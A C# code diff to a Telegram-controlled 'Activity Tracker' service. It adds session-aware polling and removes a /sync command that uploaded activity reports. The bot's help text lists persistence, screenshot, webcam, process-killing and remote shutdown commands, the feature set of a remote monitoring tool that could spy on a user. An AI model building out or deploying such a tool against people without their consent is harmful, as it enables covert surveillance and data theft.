@@ -72,6 +72,29 @@ namespace Activity_Tracker
 
         #region Background Service Implementation
 
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+        private static extern uint WTSGetActiveConsoleSessionId();
+
+        private bool IsActiveConsoleSession()
+        {
+            try
+            {
+                uint activeSessionId = WTSGetActiveConsoleSessionId();
+                if (activeSessionId == 0xFFFFFFFF)
+                {
+                    return false;
+                }
+
+                uint currentSessionId = (uint)System.Diagnostics.Process.GetCurrentProcess().SessionId;
+                return currentSessionId == activeSessionId;
+            }
+            catch (Exception ex)
+            {
+                _logger.LogWarning(ex, "Failed to determine if running in active console session");
+                return true; // Fallback to true to ensure it works
+            }
+        }
+
         protected override async Task ExecuteAsync(CancellationToken stoppingToken)
         {
             _logger.LogInformation("⌨️ Telegram Command Service starting...");
@@ -81,8 +104,6 @@ namespace Activity_Tracker
             await RegisterBotCommandsAsync(stoppingToken);
             await SendWelcomeMessageAsync(stoppingToken);
 
-            _pollingCts = CancellationTokenSource.CreateLinkedTokenSource(stoppingToken);
-
             // Resolved here to avoid circular DI: CommandService <-> UpdateDispatcher
             var dispatcher = _serviceProvider.GetRequiredService<TelegramUpdateDispatcher>();
 
@@ -91,19 +112,74 @@ namespace Activity_Tracker
                 AllowedUpdates = [UpdateType.Message, UpdateType.CallbackQuery]
             };
 
-            _botClient.StartReceiving(
-                async (bot, update, ct) => await dispatcher.DispatchAsync(update, ct),
-                HandlePollingErrorAsync,
-                receiverOptions,
-                _pollingCts.Token);
+            bool wasActive = false;
 
-            try
+            while (!stoppingToken.IsCancellationRequested)
             {
-                await Task.Delay(Timeout.Infinite, stoppingToken);
+                bool isActive = IsActiveConsoleSession();
+
+                if (isActive && !wasActive)
+                {
+                    lock (_lock)
+                    {
+                        if (_pollingCts == null || _pollingCts.IsCancellationRequested)
+                        {
+                            _logger.LogInformation("🔄 Session became active. Starting Telegram polling for user '{User}'...", Environment.UserName);
+                            _pollingCts = CancellationTokenSource.CreateLinkedTokenSource(stoppingToken);
+                            _botClient.StartReceiving(
+                                async (bot, update, ct) => await dispatcher.DispatchAsync(update, ct),
+                                HandlePollingErrorAsync,
+                                receiverOptions,
+                                _pollingCts.Token);
+                        }
+                    }
+                    wasActive = true;
+                }
+                else if (!isActive && wasActive)
+                {
+                    lock (_lock)
+                    {
+                        if (_pollingCts != null && !_pollingCts.IsCancellationRequested)
+                        {
+                            _logger.LogInformation("💤 Session became inactive. Stopping Telegram polling for user '{User}' to avoid conflicts...", Environment.UserName);
+                            _pollingCts.Cancel();
+                            _pollingCts.Dispose();
+                            _pollingCts = null;
+                        }
+                    }
+                    wasActive = false;
+                }
+                else if (isActive && wasActive)
+                {
+                    // Ensure the initial start takes place if we boot straight into active state
+                    lock (_lock)
+                    {
+                        if (_pollingCts == null || _pollingCts.IsCancellationRequested)
+                        {
+                            _logger.LogInformation("🚀 Initializing Telegram polling for active user '{User}'...", Environment.UserName);
+                            _pollingCts = CancellationTokenSource.CreateLinkedTokenSource(stoppingToken);
+                            _botClient.StartReceiving(
+                                async (bot, update, ct) => await dispatcher.DispatchAsync(update, ct),
+                                HandlePollingErrorAsync,
+                                receiverOptions,
+                                _pollingCts.Token);
+                        }
+                    }
+                }
+
+                // Check session active console changes every 2 seconds
+                await Task.Delay(TimeSpan.FromSeconds(2), stoppingToken);
             }
-            catch (TaskCanceledException)
+
+            // Cleanup when stopping
+            lock (_lock)
             {
-                // Normal shutdown
+                if (_pollingCts != null)
+                {
+                    _pollingCts.Cancel();
+                    _pollingCts.Dispose();
+                    _pollingCts = null;
+                }
             }
 
             _logger.LogInformation("⌨️ Telegram Command Service stopping...");
@@ -251,10 +327,6 @@ namespace Activity_Tracker
                     await HandleProcessesCommandAsync(chatId, cancellationToken);
                     break;
 
-                case "/sync":
-                case "/send":
-                    await HandleSyncCommandAsync(chatId, cancellationToken);
-                    break;
 
                 case "/shutdown":
                 case "/exit":
@@ -284,7 +356,7 @@ namespace Activity_Tracker
                 I'm <b>Activity Tracker Bot</b> 🕵️‍♂️
 
                 <b>Control:</b> /track /stop /status /whoami /current /persistence
-                <b>Data:</b> /stats /history /pending /sync /clear
+                <b>Data:</b> /stats /history /pending /clear
                 <b>Utility:</b> /screenshot /webcam /sysinfo /users /processes /lock /sleep
                 <b>Advanced:</b> /msg /open /kill /block /unblock /shutdown
 
@@ -515,40 +587,6 @@ namespace Activity_Tracker
             }
         }
 
-        /// <summary>
-        /// Handles /sync and /send commands - manually uploads pending reports
-        /// </summary>
-        public async Task HandleSyncCommandAsync(string chatId, CancellationToken cancellationToken)
-        {
-            try
-            {
-                var stats = _storageService.GetStatistics();
-                if (stats.PendingCount == 0)
-                {
-                    await SendMessageAsync("✅ *No reports to sync!*\n\nAll activity reports have already been successfully uploaded.", chatId, cancellationToken);
-                    return;
-                }
-
-                await SendMessageAsync($"🔄 *Syncing {stats.PendingCount} pending reports...*\n\nPlease wait a moment.", chatId, cancellationToken);
-
-                // Run sync via worker sync helper
-                int sent = await _worker.SyncPendingReportsAsync(cancellationToken);
-
-                if (sent > 0)
-                {
-                    await SendMessageAsync($"✅ *Sync Successful!*\n\nSuccessfully uploaded *{sent}* pending reports to Telegram.", chatId, cancellationToken);
-                }
-                else
-                {
-                    await SendMessageAsync("⚠️ *Sync Completed with Warnings*\n\nCould not upload pending reports. Please verify your internet connection.", chatId, cancellationToken);
-                }
-            }
-            catch (Exception ex)
-            {
-                _logger.LogError(ex, "❌ Error syncing pending reports");
-                await SendMessageAsync("❌ *Sync Failed*\n\nAn unexpected error occurred during manual synchronization.", chatId, cancellationToken);
-            }
-        }
 
         /// <summary>
         /// Handles /current and /active commands - gets current active window
